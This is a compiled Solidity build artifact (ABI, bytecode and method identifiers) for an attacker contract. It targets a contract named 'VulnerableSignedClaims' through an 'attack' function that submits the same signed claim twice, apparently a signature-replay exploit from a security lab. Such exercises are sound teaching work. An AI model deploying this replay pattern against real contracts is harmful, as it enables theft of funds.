{"abi":[{"type":"constructor","inputs":[{"name":"targetAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableSignedClaims"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[{"name":"recipient","type":"address","internalType":"address payable"},{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"salt","type":"bytes32","internalType":"bytes32"},{"name":"signature","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60a060405234801561000f575f80fd5b506040516105fc3803806105fc833981810160405281019061003191906100c9565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506100f4565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100988261006f565b9050919050565b6100a88161008e565b81146100b2575f80fd5b50565b5f815190506100c38161009f565b92915050565b5f602082840312156100de576100dd61006b565b5b5f6100eb848285016100b5565b91505092915050565b6080516104e36101195f395f8181607401528181610102015261019701526104e35ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c80637ea3498414610038578063cc1f2afa14610054575b5f80fd5b610052600480360381019061004d91906102e2565b610072565b005b61005c610195565b60405161006991906103c1565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16638d9fa7bb86868686866040518663ffffffff1660e01b81526004016100d3959493929190610461565b5f604051808303815f87803b1580156100ea575f80fd5b505af11580156100fc573d5f803e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16638d9fa7bb86868686866040518663ffffffff1660e01b8152600401610161959493929190610461565b5f604051808303815f87803b158015610178575f80fd5b505af115801561018a573d5f803e3d5ffd5b505050505050505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b5f80fd5b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101ea826101c1565b9050919050565b6101fa816101e0565b8114610204575f80fd5b50565b5f81359050610215816101f1565b92915050565b5f819050919050565b61022d8161021b565b8114610237575f80fd5b50565b5f8135905061024881610224565b92915050565b5f819050919050565b6102608161024e565b811461026a575f80fd5b50565b5f8135905061027b81610257565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f8083601f8401126102a2576102a1610281565b5b8235905067ffffffffffffffff8111156102bf576102be610285565b5b6020830191508360018202830111156102db576102da610289565b5b9250929050565b5f805f805f608086880312156102fb576102fa6101b9565b5b5f61030888828901610207565b95505060206103198882890161023a565b945050604061032a8882890161026d565b935050606086013567ffffffffffffffff81111561034b5761034a6101bd565b5b6103578882890161028d565b92509250509295509295909350565b5f819050919050565b5f61038961038461037f846101c1565b610366565b6101c1565b9050919050565b5f61039a8261036f565b9050919050565b5f6103ab82610390565b9050919050565b6103bb816103a1565b82525050565b5f6020820190506103d45f8301846103b2565b92915050565b6103e3816101e0565b82525050565b6103f28161021b565b82525050565b6104018161024e565b82525050565b5f82825260208201905092915050565b828183375f83830152505050565b5f601f19601f8301169050919050565b5f6104408385610407565b935061044d838584610417565b61045683610425565b840190509392505050565b5f6080820190506104745f8301886103da565b61048160208301876103e9565b61048e60408301866103f8565b81810360608301526104a1818486610435565b9050969550505050505056fea264697066735822122058e215b36f25eb40f45c989689013a58d23292111a6907d4761653ffa7fcc95364736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","attack(address,uint256,bytes32,bytes)":"7ea34984"},"id":19}